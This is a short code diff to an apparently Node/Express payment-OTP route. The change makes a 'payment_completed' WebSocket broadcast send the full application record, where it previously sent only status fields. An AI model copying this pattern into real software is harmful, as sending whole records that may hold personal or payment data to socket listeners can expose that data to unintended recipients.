@@ -768,11 +768,15 @@ router.post("/:id/payment-otp", async (req, res) => {
       .set({ applicationId: newApp.id, lastSeenAt: new Date() })
       .where(eq(sessionsTable.id, newApp.sessionId));
 
-    // إرسال إشعار WebSocket
+    // إرسال إشعار WebSocket مع بيانات التطبيق الكاملة
     broadcast({
       type: "payment_completed",
       sessionId: newApp.sessionId,
-      data: { paymentStatus: "completed", currentStep: "success" },
+      data: {
+        ...newApp,
+        applicantName: newApp.fullName || newApp.companyName || newApp.contactName || null,
+        eventType: "payment"
+      },
     });
 
     res.json({
